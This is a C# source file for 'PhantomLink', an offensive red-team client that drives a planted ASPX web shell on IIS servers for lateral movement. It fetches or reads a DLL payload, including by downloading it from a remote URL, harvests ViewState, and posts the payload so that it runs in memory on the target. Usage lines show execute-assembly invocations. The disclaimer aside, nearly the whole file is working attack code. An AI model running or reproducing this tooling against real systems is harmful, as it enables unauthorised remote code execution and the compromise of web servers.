/* 

Author : @zux0x3a 
Site : 0xsp.com 

The purpose of the tool is replicate a realistic attach chain for IIS lateral movement technique, the tool is made for a matter of sharing knowledge and should not be used 
without legal letter of authorization to conduct testing. 

It is highly recommended to test this on your local environment before replicating on production, the author of this tool is not responsible for any damage caused by the usage of such 
a tool. 


how to compile? 

msbuild WebShellClient.csproj /p:Configuration=Release

Or with csc.exe directly:

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:WebShellClient.exe WebShellClient.cs



*/ 


using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace PhantomLink
{
    class Program
    {
        static readonly string[] ValidSignatures = new string[]
        {
            "void_void_cdecl",
            "void_void_stdcall",
            "int_void_cdecl",
            "int_void_stdcall",
            "string_void_cdecl",
            "int_string_cdecl",
            "void_string_cdecl",
            "string_string_cdecl",
            "threadproc",
            "thread_execute",
            "apc_execute"
        };

        static void Main(string[] args)
        {
            // these are default values, you need to change based on your choice. 
            string url = null;
            string token = null;
            string web_payload = null; 
            string b64Payload = null;
            string funcName = "Run";
            string signature = "thread_execute";
            string funcArgs = "";
            string b64File = null;
            bool ignoreSsl = false;

            banner(); // print banner  

            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i];
                switch (arg.ToLower())
                {
                    case "--url":
                    case "-u":
                        if (i + 1 < args.Length) url = args[++i];
                        break;
                    case "--token":
                    case "-k":
                        if (i + 1 < args.Length) token = args[++i];
                        break;
                    case "--payload":
                    case "-p":
                        if (i + 1 < args.Length) b64Payload = args[++i];
                        break;
                    case "--file":
                    case "-f":
                        if (i + 1 < args.Length) b64File = args[++i];
                        break;
                    case "--func":
                    case "-fn":
                        if (i + 1 < args.Length) funcName = args[++i];
                        break;
                    case "--sig":
                    case "-s":
                        if (i + 1 < args.Length) signature = args[++i];
                        break;
                    case "--args":
                    case "-a":
                        if (i + 1 < args.Length) funcArgs = args[++i];
                        break;
                    case "--web-payload":
                    case "-wp": 
                            if ( i +1 < args.Length) web_payload = args[++i];
                        break; 
                    case "--ignore-ssl":
                        ignoreSsl = true;
                        break;
                    case "--help":
                    case "-h":
                        PrintUsage();
                        return;
                }
            }

            if (string.IsNullOrEmpty(url))
            {
                Console.WriteLine("[!] --url is required...!!");
                PrintUsage();
                return;
            }

            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("[!] --token is required");
              PrintUsage();
                return;
            }

         //   if (string.IsNullOrEmpty(funcName))
         //   {
         //       Console.WriteLine("[!] --funcName is required");
        //        PrintUsage(); 
       //       return; 
      //      }

            if (!string.IsNullOrEmpty(web_payload))
            {
                // here declear bytes variable to get function return 
                // the function should GET and return the bytes of shellcode or DLL 
                try
                {
                    var bytes = WebStager(web_payload);

                    b64Payload = Convert.ToBase64String(bytes);
                    Console.WriteLine("[+] Read {0} bytes from {1}", bytes.Length, web_payload);
                } catch (Exception ex) { Console.WriteLine(ex.Message); 
                
                }

            }

            if (!string.IsNullOrEmpty(b64File))
            {
                try
                {
                    byte[] fileBytes = File.ReadAllBytes(b64File);
                    b64Payload = Convert.ToBase64String(fileBytes);
                    Console.WriteLine("[*] Read {0} bytes from {1}", fileBytes.Length, b64File);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Failed to read file: {0}", ex.Message);
                    return;
                }
            }
//
           if (string.IsNullOrEmpty(b64Payload) && string.IsNullOrEmpty(web_payload)) 
           {
               Console.WriteLine("[!] --payload or --file is required");
               PrintUsage();
                return;
            }

            bool sigValid = false;
            foreach (string s in ValidSignatures)
            {
                if (s.Equals(signature, StringComparison.OrdinalIgnoreCase))
                {
                    signature = s;
                    sigValid = true;
                    break;
                }
            }
            if (!sigValid)
            {
                Console.WriteLine("[!] Invalid signature: {0}", signature);
                Console.WriteLine("[*] Valid signatures:");
                foreach (string s in ValidSignatures)
                    Console.WriteLine("      {0}", s);
                return;
            }

            // THis will bypass SSL validation if requested
            if (ignoreSsl)
            {
                ServicePointManager.ServerCertificateValidationCallback =
                    delegate { return true; };
            }

          
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            
            string targetUrl = url;
            if (targetUrl.Contains("?"))
                targetUrl += "&k=" + Uri.EscapeDataString(token);
            else
                targetUrl += "?k=" + Uri.EscapeDataString(token);

            try
            {
                Execute(targetUrl, token, b64Payload, funcName, signature, funcArgs);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: {0}", ex.Message);
            }
        }

        static void banner()
        {
            Console.WriteLine(@"
--------------------------------------------------------------------
______ _                 _                  _     _       _    
| ___ \ |               | |                | |   (_)     | |   
| |_/ / |__   __ _ _ __ | |_ ___  _ __ ___ | |    _ _ __ | | __
|  __/| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \| |   | | '_ \| |/ /
| |   | | | | (_| | | | | || (_) | | | | | | |___| | | | |   < 
\_|   |_| |_|\__,_|_| |_|\__\___/|_| |_| |_\_____/_|_| |_|_|\_\
                                                               
 by @zux0x3a                                              
--------------------------------------------------------------------
                                                                                 
                ");
        }
        static void Execute(string targetUrl, string token, string b64Payload, string funcName, string signature, string funcArgs)
        {
            CookieContainer cookies = new CookieContainer();
            Console.WriteLine("[*] GET {0}", targetUrl);

            HttpWebRequest getReq = (HttpWebRequest)WebRequest.Create(targetUrl);
            getReq.Method = "GET";
            getReq.CookieContainer = cookies;
            getReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            getReq.AllowAutoRedirect = true;
            getReq.KeepAlive = false; // might this fix the following error [!] Error: The underlying connection was closed: An unexpected error occurred on a receive.

            string pageHtml;
            using (HttpWebResponse getResp = (HttpWebResponse)getReq.GetResponse())
            using (StreamReader reader = new StreamReader(getResp.GetResponseStream(), Encoding.UTF8))
            {
                pageHtml = reader.ReadToEnd();
            }

            if (pageHtml.Contains("404 - File or directory not found"))
            {
                Console.WriteLine("[!] Access denied - got 404 decoy. Check token/host pining.");
                return;
            }

            // Extract hidden fields
            string viewState = ExtractField(pageHtml, "__VIEWSTATE");
            string viewStateGen = ExtractField(pageHtml, "__VIEWSTATEGENERATOR");
            string eventValidation = ExtractField(pageHtml, "__EVENTVALIDATION");

            if (string.IsNullOrEmpty(viewState))
            {
                Console.WriteLine("[!] Failed to extract __VIEWSTATE. Page may not have loaded correctly.");
                return;
            }

            Console.WriteLine("[+] ViewState harvested ({0} bytes)", viewState.Length);

           
            Console.WriteLine("[*] Sending payload ({0} chars base64)...", b64Payload.Length);
            Console.WriteLine("[*] Function: {0} | Signature: {1}", funcName, signature);

            
            // The ASPX uses the following control IDs: txtFuncName, ddlSignature, txtBase64Dll, txtArgs, btnLoadFromBase64
            string btnId = ExtractControlId(pageHtml, "btnLoadFromBase64");
            string txtFuncId = ExtractControlId(pageHtml, "txtFuncName");
            string ddlSigId = ExtractControlId(pageHtml, "ddlSignature");
            string txtB64Id = ExtractControlId(pageHtml, "txtBase64Dll");
            string txtArgsId = ExtractControlId(pageHtml, "txtArgs");

            // Let's build POST body request. 
            StringBuilder postData = new StringBuilder();

            AppendParam(postData, "__VIEWSTATE", viewState);
            if (!string.IsNullOrEmpty(viewStateGen))
                AppendParam(postData, "__VIEWSTATEGENERATOR", viewStateGen);
            if (!string.IsNullOrEmpty(eventValidation))
            AppendParam(postData, "__EVENTVALIDATION", eventValidation);
           
            AppendParam(postData, txtFuncId, funcName);
            AppendParam(postData, ddlSigId, signature);
            AppendParam(postData, txtArgsId, funcArgs);
            AppendParam(postData, txtB64Id, b64Payload); // what about the web stager? 
            AppendParam(postData, btnId, "Process");

            byte[] postBytes = Encoding.UTF8.GetBytes(postData.ToString());

            HttpWebRequest postReq = (HttpWebRequest)WebRequest.Create(targetUrl);
            postReq.Method = "POST";
            postReq.CookieContainer = cookies;
            postReq.ContentType = "application/x-www-form-urlencoded";
            postReq.ContentLength = postBytes.Length;
            postReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"; // you change to Edge if you prefer :)
            postReq.AllowAutoRedirect = true;
            postReq.KeepAlive = false; 

            using (Stream reqStream = postReq.GetRequestStream())
            {
                reqStream.Write(postBytes, 0, postBytes.Length);
            }

            string respHtml;
            using (HttpWebResponse postResp = (HttpWebResponse)postReq.GetResponse())
            using (StreamReader reader = new StreamReader(postResp.GetResponseStream(), Encoding.UTF8))
            {
                respHtml = reader.ReadToEnd();
            }

       
            string result = ExtractResult(respHtml);
            if (!string.IsNullOrEmpty(result))
            {
                Console.WriteLine();
                Console.WriteLine("[+] === RESULT ===");
                Console.WriteLine(result);
                Console.WriteLine("[+] === END ===");
            }
            else
            {
                Console.WriteLine("[!] No result label found in response.");

                // Try to find any error..fallback shit.
                string statusText = ExtractLabelContent(respHtml, "lblStatus");
                if (!string.IsNullOrEmpty(statusText))
                    Console.WriteLine("[*] Status: {0}", statusText);
            }
        }

        static string ExtractField(string html, string fieldName)
        {
            string pattern = @"id=""" + Regex.Escape(fieldName) + @"""\s+value=""([^""]*)""";
            Match m = Regex.Match(html, pattern, RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value;

      
            pattern = @"value=""([^""]*)""\s+id=""" + Regex.Escape(fieldName) + @"""";
            m = Regex.Match(html, pattern, RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value;

            return null;
        }



        static string ExtractControlId(string html, string shortName)
        {
            
            string pattern = @"name=""([^""]*" + Regex.Escape(shortName) + @")""";
            Match m = Regex.Match(html, pattern, RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value;

            return shortName;
        }

        static string ExtractResult(string html)
        {
            return ExtractLabelContent(html, "lblResult");
        }

        static string ExtractLabelContent(string html, string labelId)
        {
            // Thanks Claude :)
            string pattern = @"id=""[^""]*" + Regex.Escape(labelId) + @"""[^>]*>([\s\S]*?)</span>";
            Match m = Regex.Match(html, pattern, RegexOptions.IgnoreCase);
            if (m.Success)
            {
                string content = m.Groups[1].Value;
                content = content.Replace("<br />", "\n").Replace("<br>", "\n").Replace("<br/>", "\n");
                content = Regex.Replace(content, @"<[^>]+>", "");
                content = WebUtility.HtmlDecode(content);
                return content.Trim();
            }
            return null;
        }

        static void AppendParam(StringBuilder sb, string name, string value)
        {
            if (sb.Length > 0) sb.Append("&");
            //sb.Append(Uri.EscapeDataString(name));
            sb.Append(UrlEncode(name));

            sb.Append("=");
//            sb.Append(Uri.EscapeDataString(value)); // to fix uri string too long 
            sb.Append(UrlEncode(value));
        }

        static string UrlEncode(string value)
        {
            if (string.IsNullOrEmpty(value)) return string.Empty;

            const int chunksize = 32000;
            if (value.Length <= chunksize)
                return Uri.EscapeDataString(value);


            StringBuilder encoded = new StringBuilder(value.Length * 2);
            for (int i = 0; i < value.Length; i += chunksize)
            {
                int len = Math.Min(chunksize, value.Length - i);
                encoded.Append(Uri.EscapeDataString(value.Substring(i, len)));
            }
            return encoded.ToString();
        }

        static byte[] WebStager(string url)
        {
            // parse the url of remote host 
            // get the content of dll as base64 and decode it 
            // supply it directly as base64 value 
            // execute it 
            using (var client = new System.Net.WebClient())
            {
                return client.DownloadData(url); 
            }


           // return false; 
        }

        static void PrintUsage()
        {
            Console.WriteLine();
            Console.WriteLine("Phantom Link - Reflec dll via ASPX");
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("  WebShellClient.exe --url <URL> --token <TOKEN> --payload <BASE64> [options]");
            Console.WriteLine("  WebShellClient.exe --url <URL> --token <TOKEN> --file <DLL_PATH> [options]");
            Console.WriteLine();
            Console.WriteLine("Required:");
            Console.WriteLine("  --url, -u       Target ASPX URL");
            Console.WriteLine("  --token, -k     Access token (matches ACCESS_TOKEN in ASPX)");
            Console.WriteLine("  --payload, -p   Base64-encoded DLL payload");
            Console.WriteLine("  --file, -f      Path to raw DLL file (auto base64-encoded)");
            Console.WriteLine(" --webpayload, -wp Remote address to raw DLL file. ");
            Console.WriteLine();
            Console.WriteLine("Optional:");
            Console.WriteLine("  --func, -fn     Export function name (default: Run)");
            Console.WriteLine("  --sig, -s       Calling signature (default: thread_execute)");
            Console.WriteLine("  --args, -a      Argument string to pass to the function");
            Console.WriteLine("  --ignore-ssl    Skip SSL certificate validation");
            Console.WriteLine();
            Console.WriteLine("Signatures:");
            Console.WriteLine("  void_void_cdecl       void func(void) [cdecl]");
            Console.WriteLine("  void_void_stdcall     void func(void) [stdcall]");
            Console.WriteLine("  int_void_cdecl        int func(void) [cdecl]");
            Console.WriteLine("  int_void_stdcall      int func(void) [stdcall]");
            Console.WriteLine("  string_void_cdecl     char* func(void) [cdecl]");
            Console.WriteLine("  int_string_cdecl      int func(char*) [cdecl]");
            Console.WriteLine("  void_string_cdecl     void func(char*) [cdecl]");
            Console.WriteLine("  string_string_cdecl   char* func(char*) [cdecl]");
            Console.WriteLine("  threadproc            DWORD WINAPI func(LPVOID) [stdcall]");
            Console.WriteLine("  thread_execute        Execute via CreateThread [RECOMMENDED]");
            Console.WriteLine("  apc_execute           Execute via QueueUserAPC");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  PhantomLink.exe -u https://target/test.aspx -k SECRET -f payload.dll");
            Console.WriteLine("  PhantomLink.exe -u https://target/test.aspx -k SECRET -p TVAA... -fn Execute -s int_void_cdecl");
            Console.WriteLine("  execute-assembly PhantomLink.exe --url https://target.com/test.aspx --token CHANGE_ME_TO_A_RANDOM_SECRET --payload TVqAAA... --func Run --sig thread_execute");
            Console.WriteLine("  execute-assembly PhantomLink.exe --url https://target.com/test.aspx --token CHANGE_ME_TO_A_RANDOM_SECRET -f payload.dll --func Run --sig thread_execute");
        
        }
    }
}
